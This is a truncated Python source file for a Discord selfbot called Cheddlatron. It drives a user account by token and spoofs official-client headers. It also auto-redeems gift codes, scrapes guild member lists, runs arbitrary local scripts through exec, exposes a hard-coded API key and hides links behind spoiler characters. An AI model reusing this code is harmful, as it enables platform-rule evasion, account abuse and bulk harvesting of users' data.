# coding: utf8
ver = "Alpha"
stopper = False
seshid = None
seshidhash = None
currentvc = None
#IMPORTS-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------
import shutil
from typing import Union
import discord, psutil, cpuinfo, GPUtil, time, os, base64, io, random, string, urllib.parse, urllib.request, json, http.client, aiohttp, asyncio, ctypes, ctypes.wintypes, pyfiglet, re, threading, webbrowser, aiofiles, httpx, websockets, warnings, glob, typing, platform, locale
from discord.utils import get
from random import randint
from youtube_search import YoutubeSearch
from urllib.parse import urlparse
import threading
from json import *
from io import BytesIO
from petpetgif import petpet as petpetgif
from discord.ext import commands
from bs4 import BeautifulSoup as bs4
from colorama import Fore, Style
from PIL import Image, ImageDraw, ImageOps
from gtts import gTTS
from fractions import Fraction
from datetime import datetime, timedelta, timezone
from pystyle import  Colors, Colorate
from notifypy import Notify
import subprocess
import sys
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.backends import default_backend
from websockets import connect
import logging
from collections import defaultdict
import certifi
import platform
import webview
import ssl
import requests as requested
from aiohttp_socks import ProxyConnector
from discord_protos import FrecencyUserSettings
from google.protobuf.json_format import ParseDict, MessageToDict
import pkg_resources
import builtins
import urllib.parse
import winreg
os.environ['SSL_CERT_FILE'] = r"Data/Settings/Configs/cacert.pem"
#IMPORTS-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------
warnings.filterwarnings("ignore", category=DeprecationWarning, module="typing")
warnings.simplefilter("ignore", DeprecationWarning)
#REQUEST CLASS-----------------------------------------------------------------------------------------------------------------------------------------------------------------------
class reqresp:
    def __init__(self, status, data):
        self.status_code = status
        self._data = data

    @property
    def text(self):
        try:
            return self._data.decode('utf-8')
        except UnicodeDecodeError:
            return self._data

    def json(self):
        try:
            return json.loads(self._data.decode('utf-8'))
        except (json.JSONDecodeError, UnicodeDecodeError):
            return None
    
    @property   
    def content(self):
        return self._data

class requesters:
    @staticmethod
    def request(method, url, headers=None, json_data=None):
        if headers is None:
            headers = {}
        
        context = ssl.create_default_context()
        parsed_url = urlparse(url)
        host = parsed_url.netloc
        endpoint = parsed_url.path
        if parsed_url.query:
            endpoint += '?' + parsed_url.query
        
        if parsed_url.scheme == "https":
            connection = http.client.HTTPSConnection(host, context=context)
        else:
            connection = http.client.HTTPConnection(host)
        
        body = None
        if json_data is not None:
            body = json.dumps(json_data)
            headers['Content-Type'] = 'application/json'
        
        try:
            connection.request(method, endpoint, body=body, headers=headers)
            response = connection.getresponse()
            response_data = response.read()
            connection.close()
            return reqresp(response.status, response_data)
        except ConnectionRefusedError as e:
            print(f"Connection failed: {e}. Method: {method}, URL: {url}, Headers: {headers}, Body: {body}")
            return reqresp(500, b"")
        except Exception as e:
            print(f"An error occurred: {e}. Method: {method}, URL: {url}, Headers: {headers}, Body: {body}")
            return reqresp(500, b"")

    @staticmethod
    def get(url, headers=None):
        return requesters.request("GET", url, headers=headers)

    @staticmethod 
    def post(url, headers=None, json_data=None): 
        return requesters.request("POST", url, headers=headers, json_data=json_data)

    @staticmethod
    def patch(url, headers=None, json_data=None):
        return requesters.request("PATCH", url, headers=headers, json_data=json_data)

    @staticmethod
    def delete(url, headers=None, json_data=None):
        return requesters.request("DELETE", url, headers=headers, json_data=json_data)

    @staticmethod
    def put(url, headers=None, json_data=None):
        return requesters.request("PUT", url, headers=headers, json_data=json_data)
#REQUEST CLASS-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

#FUNCTIONS---------------------------------------------------------------------------------------------------------------------------------------------------------------------------
async def make_server(name, icon=None):
    conn = http.client.HTTPSConnection("discord.com")
    if icon != None:
        icon = base64.b64encode(icon).decode('utf-8')
        payload = json.dumps({
    "name": name,
    "icon": icon
    })
    else:
        payload = json.dumps({
            "name": name
            })
    headers = {
    'Authorization': config_get('token'),
    'x-super-properties': getxsuper(),
    'Content-Type': 'application/json',
    }
    conn.request("POST", "/api/v9/guilds", payload, headers)
    res = conn.getresponse()
    data = res.read()
    data = json.loads(data.decode('utf-8'))
    websocket = Cheddlatron.ws
    await websocket.send_as_json({"op":37,"d":{"subscriptions":{data['id']:{"typing":True,"threads":True,"activities":True,"members":[],"member_updates":True,"channels":{},"thread_member_lists":[]}}}})
    return data

def print(message):
    builtins.print(message)
    try:
        api.print(message)
    except:
        pass

def tokenvalid(token):
    headers = {'Authorization': token, "x-super-properties": getxsuper()}
    r = requesters.get("https://discord.com/api/v9/users/@me" , headers=headers)
    if r.status_code == 200:
        return True
    else:
        return False

def del_value(key):
    with open('config.json', 'r') as file:
        data_dict = json.load(file)
    if key in data_dict:
        del data_dict[key]
    with open('config.json', 'w') as file:
        json.dump(data_dict, file, indent=4)

def resize_terminal():
    os_name = platform.system()
    if os_name == "Darwin" or os_name == "Linux":
        print("\033[8;30;100t")
resize_terminal()

def create_folder(folder_path):
    if not os.path.exists(folder_path):
        os.makedirs(folder_path)
        print(f"Creating {folder_path}")

def download_file(url, path):
    if os.path.exists(path):
        return   
    if url == '{}':
        with open(path, 'w') as f:
            f.write('{\n}')
        print(f"Creating {path}")
    else:
        response = requesters.get(url)
        with open(path, 'wb') as f:
            for chunk in response.iter_content(chunk_size=8192):
                f.write(chunk)
        print(f"Creating {path}")

def open_config_read(file_path="config.json"):
    with open(file_path, "r", encoding="utf-8") as json_file:
        data = json.load(json_file)
    return data

def checkwebhook(url):
    req = requesters.get(url)
    if req.status_code == 200:
        return True
    else:
        return False

def filesafe(filename):
    replacements = {
        '<': 'lt',
        '>': 'gt',
        ':': '_colon_',
        '"': '_quote_',
        '/': '_slash_',
        '\\': '_backslash_',
        '|': '_pipe_',
        '?': '_questionmark_',
        '*': '_asterisk_'
    }
    for char, replacement in replacements.items():
        filename = filename.replace(char, replacement)
    filename = filename.strip()
    filename = re.sub(r'^\.|\.$', '', filename)
    filename = re.sub('_+', '_', filename)
    filename = filename.rstrip('. ')
    return filename

def open_config_write_if_not_exists(config_data, key, prompt=None):
    while key not in config_data or config_data[key] is None:
        while True:
            if prompt is not None:
                user_input = input(prompt)
            else:
                user_input = input(f"\nEnter value for {key}: ")
            if key == "token":
                valid = tokenvalid(user_input)
                if valid:
                    config_data[key] = user_input
                    break
                else:
                    print("Token is invalid, please try again.")
            elif key == "giveaway_delay":
                try:
                    user_input = int(user_input)
                    config_data[key] = user_input
                    break
                except:
                    print("Please input an integer. Please take note that this is seconds.")
            elif key == "device":
                dict = ["console", "web", "mobile", "desktop"]
                if user_input.lower() not in dict:
                    print("Please input a valid device (console, web, mobile, desktop)...")
                else:
                    config_data[key] = user_input
                    break
            elif key == "rpc":
                if user_input.lower() == "true":
                    config_data[key] = "rpc"
                    break
                elif user_input.lower() == "false":
                    config_data[key] = ""
                    break
                else:
                    print("Please input either true or false...")
            elif key == "delete_timer":
                try:
                    user_input = int(user_input)
                    config_data[key] = user_input
                    break
                except:
                    print("Please input an integer. Please take note that this is seconds.")
            elif "webhook url" in prompt:
                if user_input == "":
                    config_data[key] = user_input
                    break
                if re.search('https:\/\/(canary\.|ptb\.)?(discord|discordapp)\.com\/api\/webhooks\/\d+\/[\w-]+', user_input):
                    if checkwebhook(user_input):
                        config_data[key] = user_input
                        break
                    else:
                        print("Webhook invalid, please try again.")
                else:
                    print("That is not a webhook url...")
            elif "True" in prompt:
                if user_input.lower() == "true":
                    config_data[key] = True
                    break
                elif user_input.lower() == "false":
                    config_data[key] = False
                    break
                else:
                    print("Invalid input. Please enter 'True' or 'False'.")
            else:
                config_data[key] = user_input
                break
        with open('config.json', 'w') as t:
            json.dump(config_data, t, indent=4)

ccs = []
def customcmds():
    custom_commands_executed = 0
    global command_names
    globals_dict = globals()  
    try:
        for thing in os.listdir('Data/CustomCmds'):
            if thing.endswith(".py"):
                file_path = os.path.join('Data/CustomCmds', thing).replace('\\', '/')
                with open(file_path, encoding="utf-8") as file:
                    code = file.read()
                pattern = r"@Cheddlatron\.command\(.*?help\s*=\s*['\"](.*?)['\"].*?\)"
                matches = re.findall(pattern, code, re.DOTALL)
                for match in matches:
                    code = code.replace(match, match.lower())
                try:
                    compiled_code = compile(code, file_path, 'exec')
                    exec(compiled_code, globals_dict, globals_dict)
                    custom_commands_executed += 1
                    lines = code.splitlines()
                    decorator_found = False
                    def_pattern = r'(?:(?:async\s+)?def\s+)(\w+)(?=\()'

                    for line in lines:
                        line = line.strip()
                        if line.startswith("@Cheddlatron.command"):
                            decorator_found = True 
                        elif decorator_found and re.search(def_pattern, line):
                            command_name = re.match(def_pattern, line).group(1)
                            ccs.append(command_name)
                            decorator_found = False
                except SyntaxError as se:
                    print(f"Syntax error in file {file_path}: {se}")
    except Exception as e:
        print(f"Error loading custom commands: {e}")
    return custom_commands_executed

def count_custom_commands():
    custom_commands_counted = 0
    try:
        for thing in os.listdir('Data/CustomCmds'):
            if thing.endswith(".py"):
                file_path = os.path.join('Data/CustomCmds', thing)
                with open(file_path, encoding="utf-8") as file:
                    code = file.read()
                try:
                    compile(code, file_path, 'exec')
                    custom_commands_counted += 1
                except SyntaxError:
                    pass
    except Exception as e:
        pass
    return custom_commands_counted

def config_get(data):
    with open('config.json', 'r') as f:
        config = json.load(f)
    value = config.get(data)
    return value

def config_edit(data, new_value):
    with open('config.json', 'r') as f:
        config = json.load(f)
    config[data] = new_value
    with open('config.json', 'w') as f:
        json.dump(config, f, indent=4)

def setting_get(data):
    with open('Data/Settings/Configs/Settings.json', 'r') as f:
        Settings = json.load(f)
    value = Settings.get(data)
    return value

def setting_edit(data, new_value):
    settings_path = 'Data/Settings/Configs/Settings.json'
    if os.path.exists(settings_path):
        with open(settings_path, 'r') as f:
            Settings = json.load(f)
    else:
        Settings = {}
    if isinstance(new_value, bool):
        Settings[data] = new_value
    else:
        if data in Settings:
            if isinstance(Settings[data], list):
                if new_value in Settings[data]:
                    Settings[data].remove(new_value)
                else:
                    Settings[data].append(new_value)
            else:
                Settings[data] = [Settings[data], new_value]
        else:
            Settings[data] = [new_value]
    with open(settings_path, 'w') as f:
        json.dump(Settings, f, indent=4)

def notif(message):
    notification = Notify()
    notification.application_name = "Cheddlatron Selfbot"
    notification.title = f"Cheddlatron"
    notification.message = message
    notification.icon = "cheddlatronlogo.ico"
    notification.send()

def windowname(commandsdone):
    if os.name == "nt":
             ctypes.windll.kernel32.SetConsoleTitleW(f"Cheddlatron  |  Cmds Used: {commandsdone}  |  Amount of guilds: {len(Cheddlatron.guilds)}  |  Prefix: {config_get('prefix')}  |  {config_get('prefix')}help for help command!")

def get_time():
    t = time.localtime()
    current_time = time.strftime("%H:%M:%S", t)
    final_time = current_time.split(':')
    return f'{final_time[0]}:{final_time[1]}'

def check_and_replace_empty(config_value):
    return None if config_value == "" else config_value

def split_into_chunks(input_message, maxlength):
    chunks = []
    input_message = input_message.replace('%20', ' ')
    while len(input_message) > maxlength:
        split_pos = input_message.rfind(' ', 0, maxlength) 
        if split_pos == -1:
            split_pos = maxlength
            chunk = input_message[:split_pos].rstrip()
            chunks.append(chunk)
            input_message = input_message[split_pos:].lstrip()
        else:
            chunk = input_message[:split_pos].rstrip()
            chunks.append(chunk)
            input_message = input_message[split_pos:].lstrip()
    if input_message:
        chunks.append(input_message)
    chunks = [chunk.replace(' ', '%20') for chunk in chunks]
    return chunks

async def panelmaker(ctx, heading, body, cmdname, comment=""):
    date = datetime.now().strftime("%d-%m-%y")
    if config_get('embed_mode').lower() != "indent" and config_get('embed_mode').lower() != "web" and config_get('embed_mode').lower() != "app":
        config_edit('embed_mode', "web")
    if config_get('embed_mode').lower() == "indent":
        panel = f"""
>>> # __`{heading}`__
** **
```{body}```
"""
        if comment:
            panel += f"```{comment}```\n"
        panel += f"```[Ver] {ver} | Date: {date} | {cmdname} CMD```"
        max_body_len = max(len(line) for line in body.split("\n"))
        max_comment_len = len(comment) if comment else 0
        max_bottom_len = len(f"[Ver] {ver} | Date: {date} | {cmdname} CMD")
        max_line_length = max(max_body_len, max_comment_len, max_bottom_len)
        padding = ((max_line_length - len(heading)) // 2) - 5
        if padding < 0:
            padding = 0
        centered_heading = f"{padding * ' '}{heading}{padding * ' '}"
        panel = panel.replace(f"__`{heading}`__", f"__`{centered_heading}`__")
        await ctx.send(panel, delete_after=int(config_get('delete_timer')))

    if config_get('embed_mode').lower() == "web":
        title_url = check_and_replace_empty(load_Embed_config()['title_url'])
        colour = check_and_replace_empty(load_Embed_config()['color'])
        img = check_and_replace_empty(load_Embed_config()['image'])
        prov_url = check_and_replace_empty(load_Embed_config()['cmd_url'])
        colour = colour.strip('#')
        if comment is None:
            body=body
        elif comment is not None:
            body=f"{body}\n\n{comment}"
        body = urllib.parse.quote_plus(body)
        heading = urllib.parse.quote_plus(heading)
        cmdname = urllib.parse.quote_plus(cmdname)
        if len(body) > 349:
            bodies = split_into_chunks(body, 349)
            count = 0
            for body in bodies:
              if count == 0:
                url = f"https://embed.3l.wtf/api/embed?title={heading}&url={title_url}&color={colour}&image={img}&provider_name={cmdname}%20CMD&provider_url={prov_url}&description={body}"
              else:
                  url = f"https://embed.3l.wtf/api/embed?color={colour}&description={body}"
              sendable_url = f"‏‏‎‎||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||‎‎||‎||‎‎||‎‎||‎‎||‎‎||||||||||||||||||||||{url}"
              await ctx.send(sendable_url, delete_after=int(config_get('delete_timer')))
              count += 1
            return
        url = f"https://embed.3l.wtf/api/embed?title={heading}&url={title_url}&color={colour}&image={img}&provider_name={cmdname}%20CMD&provider_url={prov_url}&description={body}"
        sendable_url = f"‏‏‎‎||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||‎‎||‎||‎‎||‎‎||‎‎||‎‎||||||||||||||||||||||{url}"
        await ctx.send(sendable_url, delete_after=int(config_get('delete_timer')))
    if config_get('embed_mode').lower() == "app":
        title_url = check_and_replace_empty(load_Embed_config()['title_url'])
        colour = check_and_replace_empty(load_Embed_config()['color'])
        img = check_and_replace_empty(load_Embed_config()['image'])
        auth_url = check_and_replace_empty(load_Embed_config()['cmd_url'])
        if comment is None:
            body=body
        elif comment is not None:
            body=f"{body}\n\n{comment}"
        jsondata = {
            "type": 2,
            "application_id": "1298647912456257557",
            "channel_id": f"{ctx.channel.id}",
            "session_id": f"{seshid}",
            "data": {
                "version": "1298757776662724628",
                "id": "1298723469831180358",
                "name": "embed",
                "type": 1,
                "options": [
                {
                    "type": 3,
                    "name": "heading",
                    "value": heading
                },
                {
                    "type": 3,
                    "name": "body",
                    "value": f"{body}"
                },
                {
                    "type": 3,
                    "name": "cmdname",
                    "value": f"{cmdname} CMD"
                },
                {
                    "type": 3,
                    "name": "titleurl",
                    "value": title_url
                },
                {
                    "type": 3,
                    "name": "color",
                    "value": colour
                },
                {
                    "type": 3,
                    "name": "image",
                    "value": img
                },
                {
                    "type": 3,
                    "name": "cmdurl",
                    "value": auth_url
                }
                ],
                "application_command": {
                "id": "1298723469831180358",
                "type": 1,
                "application_id": "1298647912456257557",
                "version": "1298757776662724628",
                "name": "embed",
                "description": "…",
                "options": [
                    {
                    "type": 3,
                    "name": "heading",
                    "description": "…",
                    "required": True,
                    "description_localized": "…",
                    "name_localized": "heading"
                    },
                    {
                    "type": 3,
                    "name": "body",
                    "description": "…",
                    "required": True,
                    "description_localized": "…",
                    "name_localized": "body"
                    },
                    {
                    "type": 3,
                    "name": "cmdname",
                    "description": "…",
                    "required": True,
                    "description_localized": "…",
                    "name_localized": "cmdname"
                    },
                    {
                    "type": 3,
                    "name": "titleurl",
                    "description": "…",
                    "required": True,
                    "description_localized": "…",
                    "name_localized": "titleurl"
                    },
                    {
                    "type": 3,
                    "name": "color",
                    "description": "…",
                    "required": True,
                    "description_localized": "…",
                    "name_localized": "color"
                    },
                    {
                    "type": 3,
                    "name": "image",
                    "description": "…",
                    "required": True,
                    "description_localized": "…",
                    "name_localized": "image"
                    },
                    {
                    "type": 3,
                    "name": "cmdurl",
                    "description": "…",
                    "required": True,
                    "description_localized": "…",
                    "name_localized": "cmdurl"
                    }
                ],
                "dm_permission": True,
                "contexts": [0, 1, 2],
                "integration_types": [1],
                "description_localized": "…",
                "name_localized": "embed"
                },
                "attachments": []
            },
            "analytics_location": "slash_ui"
        }
        if not isinstance(ctx.channel, discord.DMChannel) and not isinstance(ctx.channel, discord.GroupChannel):
            jsondata["guild_id"] = str(ctx.guild.id)
        headers = {"Authorization": config_get('token'), 'X-Super-Properties': getxsuper()}
        req = requesters.post("https://discord.com/api/v9/interactions", headers=headers, json_data=jsondata)

def apply_theming(text):
    variables = {
        '{red}': Fore.RED,
        '{blue}': Fore.BLUE,
        '{cyan}': Fore.CYAN,
        '{green}': Fore.GREEN,
        '{yellow}': Fore.YELLOW,
        '{white}': Fore.WHITE,
        '{magenta}': Fore.MAGENTA,
        '{black}': Fore.BLACK,
        '{bright}': Style.BRIGHT,
        '{dim}': Style.DIM,
        '{reset}': Fore.RESET,
        '{friends}': str(len(Cheddlatron.user.friends)),
        '{guilds}': str(len(Cheddlatron.guilds)),
        '{commands}': str(len(Cheddlatron.commands)),
        '{prefix}': config_get('prefix'),
        '{version}': ver,
        '{user}': Cheddlatron.user.name,
        '{discord}': "https://discord.gg/9FFDd3y9Rv",
        '{customcmds}': str(count_custom_commands()),
        '{nitrosniper}': str(config_get('nitro_sniper')),
        '{pinglogger}': str(config_get('pinglogger')),
        '{rpc}': str(config_get('rpc')),
        '{giveawaysniper}': str(config_get('giveaway_sniper')),
        '{webhooknotifs}': str(config_get('webhooknotifs')),
        '{afkmode}': str(config_get('afkmode')),
        '{afkmsg}': str(config_get('afkmsg')),
        '{embedmode}': str(config_get('embedmode'))
    }
    for key, variable in variables.items():
        text = text.replace(key, variable)
    return text

def read_theme(file_path):
    theme_dir = "Data//Themes//"
    matched_files = glob.glob(f"{theme_dir}{file_path}*")
    if not matched_files:
        print(f"{Fore.LIGHTRED_EX}[Error]: {Fore.WHITE}No file named '{file_path}' found. Loading Cheddlatron theme instead.")
        time.sleep(3)
        config_edit('theme', "")
        clear_console()
        terminalui()
        return
    file_path = matched_files[0]
    try:
        with open(file_path, 'r', encoding='utf-8') as file:
            content = file.read()
            themed_content = apply_theming(content)
            print(themed_content)
    except FileNotFoundError:
        print(f"{Fore.LIGHTRED_EX}[Error]: {Fore.WHITE}File '{file_path}' not found. Loading Cheddlatron theme instead.")
        asyncio.run(send_webhook("Theme File Error", f"File '{file_path}' not found. Attempting to load default theme.", config_get('error_webhook_url')))
        asyncio.sleep(3)
        config_edit('theme', "")
        clear_console()
        terminalui()
    except Exception as e:
        print(f"{Fore.LIGHTRED_EX}[Error]: {Fore.WHITE}{e}")
        asyncio.run(send_webhook("Unexpected Theme Error", f"An unexpected error occurred: {str(e)}. Please check the logs for more details.", config_get('error_webhook_url')))

def urlify(s):
    s = re.sub(r"\s+", '+', s)
    return s

def urlif(s):
    s = re.sub(r"\s+", '-', s)
    return s

def cycle_statuses_thread(status1, status2):
    while config_get('cyclestatus') is True:
        try:
            content = {"custom_status": {"text": status1}}
            requesters.patch("https://ptb.discordapp.com/api/v9/users/@me/settings", headers={"authorization": config_get('token')}, json_data=content)
            time.sleep(3)
            con = {"custom_status": {"text": status2}}
            requesters.patch("https://ptb.discordapp.com/api/v9/users/@me/settings", headers={"authorization": config_get('token')}, json_data=con)
            time.sleep(3)
        except Exception as e:
            print(f"{Fore.LIGHTRED_EX}[ERROR]: {Fore.WHITE}Something went wrong: {e}")
            asyncio.run(send_webhook("Cycle Statuses Error", f"An error occurred while cycling statuses: {str(e)}", config_get('error_webhook_url')))
    
def clear_console():
    api.cls()

def load_rpc_config():
    with open("Data/Settings/Configs/RPC.json", "r") as rpc_file:
        rpc_config = json.load(rpc_file)
    return rpc_config

async def anontoken():
    spotifytoken = json.loads(requesters.get('https://open.spotify.com/get_access_token').text)['accessToken']
    spotifytoken = f"Bearer {spotifytoken}"
    return spotifytoken

async def spotify_access():
    r = json.loads(requesters.get('https://canary.discord.com/api/v9/users/@me/connections', headers={'authorization': config_get('token')}).text)
    newauth = None
    for thing in r:
        if thing['type'] == 'spotify':
            try:
                r = json.loads(requesters.get(f'https://discord.com/api/v9/users/@me/connections/spotify/{thing["id"]}/access-token', headers={'authorization': 'token'}).text)['access_token']
                newauth = r
            except:
                newauth = thing['access_token']
            newauth = f'Bearer {newauth}'
            return newauth
    if newauth== None:
        return False
    
def load_Webhooks_config():
    with open("Data/Settings/Configs/Webhooks.json", "r") as Webhooks_file:
        Webhooks_config = json.load(Webhooks_file)
    return Webhooks_config

def load_Embed_config():
    mainconfiggers = "config.json"
    deftheme = "Data/Settings/Configs/Ethemes/Default.json"
    try:
        with open(mainconfiggers, "r") as main_config_file:
            main_config = json.load(main_config_file)
            theme_name = main_config.get("etheme")
            
            if theme_name and theme_name.strip():
                theme_path = f"Data/Settings/Configs/Ethemes/{theme_name}.json"
                if os.path.isfile(theme_path):
                    with open(theme_path, "r") as theme_file:
                        return json.load(theme_file)
    except FileNotFoundError:
        pass
    except json.JSONDecodeError:
        pass
    with open(deftheme, "r") as default_file:
        return json.load(default_file)

async def jeyyapi(ctx, user: discord.User, endpointer: str, file_extension: str):
    
    if user.avatar.is_animated() != True:
        format = "png"
    else:
        format = "gif"
    pfp = str(user.avatar.replace(format=format, size=1024)) 
    params = {'image_url': pfp}
    headers = {'Authorization': 'Bearer 64O3CE9P6KQ32C9O6KR30D9J6GQJAE0.CDK6AP34DHGN8SJFDO.zeQbzIsfPBg2VbK17bD8IQ'}
    async with aiohttp.ClientSession() as session:
        async with session.get(f'https://api.jeyy.xyz/v2/image/{endpointer}', params=params, headers=headers) as response:
            buffer = io.BytesIO(await response.read())
            await ctx.send(file=discord.File(buffer, f'Cheddlatron_{endpointer}.{file_extension}'))

async def redeem_code(code, token):
    async with httpx.AsyncClient() as client:
        response = await client.post(f'https://discord.com/api/v9/entitlements/gift-codes/{code}/redeem', headers={'Authorization': token})
    return response.text

async def send_webhook(title,description,webhook):
    if webhook == "" or None:
        return
    data = {"username": load_Webhooks_config()['Webhook_Username'],
            "avatar": load_Webhooks_config()['Webhook_Avatar'],
            "embeds": [{
            "title": title,
            "description": description,
            "color": load_Webhooks_config()['Webhook_Colour'],
            "thumbnail": {"url": load_Webhooks_config()['Webhook_Image']}}]}
    requesters.post(webhook, json_data=data) 


def extract_asset_files():
    request = requesters.get("https://discord.com/login")
    pattern = r'<script\s+src="([^"]+\.js)"\s+defer>\s*</script>'
    matches = re.findall(pattern, request.text)
    return matches


def get_live_build_number():
    try:
        files = extract_asset_files()
        for file in files:
            build_url = f"https://discord.com{file}"
            response = requesters.get(build_url)
            if "buildNumber" in response.text:
                build_number = response.text.split('build_number:"')[1].split('"')[0]
                return int(build_number)
        return None
    except Exception as e:
        return None

cached_xsuper = None

def getxsuper():
    global cached_xsuper
    if cached_xsuper:
        return cached_xsuper
    os = platform.system()
    browser = "Discord Client"
    osarch = platform.architecture()[0]
    if osarch == '64bit':
        osarch = 'x64'
    elif osarch == '32bit':
        osarch = 'x32'
    current_locale = locale.getdefaultlocale()[0]
    try:
        syslocale = current_locale.replace("_", "-")
    except:
        syslocale = "en-GB"
    osver = platform.version()
    cbuild = get_live_build_number()
    x = {"os":os,"client_build_number":cbuild, "os_version":osver, "system_locale":syslocale,"browser":browser}
    json_str = json.dumps(x)
    xsuper = base64.b64encode(json_str.encode()).decode()
    cached_xsuper = xsuper
    return xsuper

def gettokens():
    file = open('tokens.txt', 'r')
    tokens = [line.strip() for line in file]
    return tokens

def check_and_add_alias(command_name, alias):
    command = Cheddlatron.get_command(command_name)
    with open("Data//Settings//Configs//aliases.json", "r") as file:
        aliases = json.load(file)
    
    alias_exists = any(alias in alias_list for alias_list in aliases.values())
    
    if alias_exists:
        heading = "Error"
        body = f"Alias '{alias}' already exists."
        cmdname = "ERROR"
    elif command:
        if alias not in command.aliases:
            command.aliases.append(alias)
            aliases.setdefault(command_name, []).append(alias)
            with open('Data//Settings//Configs//aliases.json', 'w') as file:
                json.dump(aliases, file, indent=4)
            Cheddlatron.remove_command(command.name)
            new_command = commands.Command(command.callback, name=command.name, aliases=command.aliases, description=command.description)
            Cheddlatron.add_command(new_command)
            heading = "Successfully added alias!"
            body = f"Alias '{alias}' added for command '{command_name}'!"
            cmdname = "alias"
        with open('Data//Settings//Configs//aliases.json', 'w') as file:
            json.dump(aliases, file, indent=4)
        heading = "Successfully added alias!"
        body = f"Alias '{alias}' added for command '{command_name}'!"
        cmdname = "alias"
    else:
        heading = "Error"
        body = f"Command '{command_name}' not found."
        cmdname = "ERROR"
    return heading, body, cmdname

def check_and_remove_alias(alias):
    with open("Data//Settings//Configs//aliases.json", "r") as file:
        aliases = json.load(file)
    
    alias_found = any(alias in alias_list for alias_list in aliases.values())
    
    if not alias_found:
        heading = "Error"
        body = f"Alias '{alias}' does not exist."
        cmdname = "ERROR"
        return heading, body, cmdname

    for command_name, alias_list in aliases.items():
        if alias in alias_list:
            alias_list.remove(alias)
            if not alias_list:
                del aliases[command_name]
            break 
    
    with open('Data//Settings//Configs//aliases.json', 'w') as file:
        json.dump(aliases, file, indent=4)
    for command_name, command_alias in list(Cheddlatron.all_commands.items()):
        if command_name == alias:
            del Cheddlatron.all_commands[command_name]
        
    heading = "Successfully removed alias!"
    body = f"Alias '{alias}' removed."
    cmdname = "alias"
    
    return heading, body, cmdname

def load_custom_aliases():
    with open("Data//Settings//Configs//aliases.json", "r") as file:
        aliases = json.load(file)
    
    for command_name, alias_list in aliases.items():
        command = Cheddlatron.get_command(command_name)
        if command:
            new_command = commands.Command(command.callback, name=command.name, aliases=alias_list, description=command.description)
            Cheddlatron.remove_command(command.name)
            Cheddlatron.add_command(new_command)

async def scrape(guild_id, count):
    fullmemberlist = set()
    char_list = list('abcdefghijklmnopqrstuvwxyz0123456789_.!-_@*?$/')
    alphabet = char_list
    guild = await Cheddlatron.fetch_guild(int(guild_id))
    max_members = count

    for idx, fuckinwhatcunt in enumerate(alphabet):
        if len(fullmemberlist) >= max_members:
            return list(fullmemberlist)

        members = await guild.query_members(query=fuckinwhatcunt, limit=100, user_ids=None, presences=False, cache=False)
        fullmemberlist.update([member for member in members])

    return list(fullmemberlist)

async def scrapeid(guild_id, count):
    fullmemberlist = set()
    char_list = list('abcdefghijklmnopqrstuvwxyz0123456789_.!-_@*?$/')
    alphabet = char_list
    guild = await Cheddlatron.fetch_guild(int(guild_id))
    max_members = count

    for idx, char in enumerate(alphabet):
        if len(fullmemberlist) >= max_members:
            return list(fullmemberlist)

        members = await guild.query_members(query=char, limit=100, user_ids=None, presences=False, cache=False)
        fullmemberlist.update([member.id for member in members])

    return list(fullmemberlist)

def yougotnitrobro():
    headers = {"authorization": config_get('token'), "x-super-properties": getxsuper()}
    r = requesters.get("https://discord.com/api/v9/users/@me", headers=headers).json()
    nitrogenous_gas = r.get('premium_type')
    if nitrogenous_gas == 0:
        return "no"
    elif nitrogenous_gas == 1:
        return "basic"
    elif nitrogenous_gas == 2:
        return "nitro"

def getmediatype(url):
    mediatypes = ["gif", "png"]
    for i in range(len(mediatypes)):
        r = requesters.get(f"{url}.{mediatypes[i]}")
        if r.status_code == 200:
            return mediatypes[i]
    return "png"

async def aigen(ctx, prompt: str, model: str, negative="", seed=None):
    promptlist = prompt.lower().split(' ')
    pornlist = ["nude", "naked", "lewd", "risque", "porn", "boob", "boobs", "pussy", "vagina", "penis", "dick", "ass", "genital", "genitals", "breast", "breasts", "nigger", "fuck", "fucking", "bitch", "anal", "hentai"]
    proflist = {
